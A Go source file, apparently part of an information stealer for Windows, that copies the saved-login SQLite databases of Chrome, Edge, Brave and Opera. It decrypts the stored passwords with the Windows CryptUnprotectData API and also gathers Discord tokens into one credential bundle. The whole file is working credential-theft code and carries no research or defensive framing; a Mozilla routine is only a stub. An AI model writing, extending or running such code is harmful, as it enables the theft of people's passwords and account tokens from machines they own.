package utils

import (
	"database/sql"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

type CredentialData struct {
	BrowserData    []BrowserCredential `json:"browser_data"`
	DiscordTokens  []string            `json:"discord_tokens"`
	StoredSessions []string            `json:"stored_sessions"`
}

type BrowserCredential struct {
	Browser  string `json:"browser"`
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type BrowserInfo struct {
	Name         string
	ProfilesPath string
	DatabaseFile string
	IsChromeBase bool
}

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:b.cbData:b.cbData])
	return d
}

func decryptPassword(data []byte) (string, error) {
	if len(data) == 0 {
		return "", nil
	}

	if len(data) > 3 && (string(data[:3]) == "v10" || string(data[:3]) == "v11") {

		data = data[3:]
	}

	dataIn := NewBlob(data)
	dataOut := new(DATA_BLOB)

	r, _, err := procDecryptData.Call(
		uintptr(unsafe.Pointer(dataIn)),
		0,
		0,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(dataOut)),
	)

	if r == 0 {
		return "", err
	}

	decrypted := dataOut.ToByteArray()
	defer procLocalFree.Call(uintptr(unsafe.Pointer(dataOut.pbData)))

	return string(decrypted), nil
}

func GetAllCredentials() (*CredentialData, error) {
	result := &CredentialData{
		BrowserData:    make([]BrowserCredential, 0),
		DiscordTokens:  make([]string, 0),
		StoredSessions: make([]string, 0),
	}

	userProfile := os.Getenv("USERPROFILE")
	localAppData := os.Getenv("LOCALAPPDATA")

	browsers := []BrowserInfo{
		{
			Name:         "Chrome",
			ProfilesPath: filepath.Join(localAppData, "Google", "Chrome", "User Data"),
			DatabaseFile: "Login Data",
			IsChromeBase: true,
		},
		{
			Name:         "Microsoft Edge",
			ProfilesPath: filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
			DatabaseFile: "Login Data",
			IsChromeBase: true,
		},
		{
			Name:         "Brave",
			ProfilesPath: filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data"),
			DatabaseFile: "Login Data",
			IsChromeBase: true,
		},
		{
			Name:         "Opera",
			ProfilesPath: filepath.Join(userProfile, "AppData", "Roaming", "Opera Software", "Opera Stable"),
			DatabaseFile: "Login Data",
			IsChromeBase: true,
		},
	}

	for _, browser := range browsers {
		if browser.IsChromeBase {
			creds, err := getChromiumCredentials(browser)
			if err == nil && len(creds) > 0 {
				result.BrowserData = append(result.BrowserData, creds...)
			}
		} else {
			creds, err := getMozillaCredentials(browser)
			if err == nil && len(creds) > 0 {
				result.BrowserData = append(result.BrowserData, creds...)
			}
		}
	}

	if tokens, err := SearchDiscordTokens(); err == nil && len(tokens) > 0 {
		result.DiscordTokens = tokens
	}

	return result, nil
}

func getChromiumCredentials(browser BrowserInfo) ([]BrowserCredential, error) {
	var credentials []BrowserCredential

	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3"}

	for _, profile := range profiles {
		dbPath := filepath.Join(browser.ProfilesPath, profile, browser.DatabaseFile)

		if _, err := os.Stat(dbPath); os.IsNotExist(err) {
			continue
		}

		tmpDB := dbPath + ".tmp"
		if err := copyFile(dbPath, tmpDB); err != nil {
			continue
		}

		db, err := sql.Open("sqlite3", tmpDB)
		if err != nil {
			os.Remove(tmpDB)
			continue
		}

		rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
		if err == nil {
			for rows.Next() {
				var url, username string
				var encryptedPass []byte
				if err := rows.Scan(&url, &username, &encryptedPass); err != nil {
					continue
				}

				if len(username) > 0 {

					password, err := decryptPassword(encryptedPass)
					if err != nil {
						password = "[Error al desencriptar]"
					}

					credentials = append(credentials, BrowserCredential{
						Browser:  browser.Name,
						URL:      url,
						Username: username,
						Password: password,
					})
				}
			}
			rows.Close()
		}

		db.Close()
		os.Remove(tmpDB)
	}

	return credentials, nil
}

func getMozillaCredentials(browser BrowserInfo) ([]BrowserCredential, error) {
	var credentials []BrowserCredential

	profiles, err := os.ReadDir(browser.ProfilesPath)
	if err != nil {
		return nil, err
	}

	for _, profile := range profiles {
		if strings.HasSuffix(profile.Name(), ".default-release") ||
			strings.Contains(profile.Name(), "default") {

			profilePath := filepath.Join(browser.ProfilesPath, profile.Name())

			key4Path := filepath.Join(profilePath, "key4.db")
			loginPath := filepath.Join(profilePath, browser.DatabaseFile)

			if _, err := os.Stat(key4Path); err == nil {
				if _, err := os.Stat(loginPath); err == nil {

					credentials = append(credentials, BrowserCredential{
						Browser:  browser.Name,
						URL:      "Profile: " + profile.Name(),
						Username: "[Requiere implementación NSS]",
						Password: "[Requiere implementación NSS]",
					})
				}
			}
		}
	}

	return credentials, nil
}
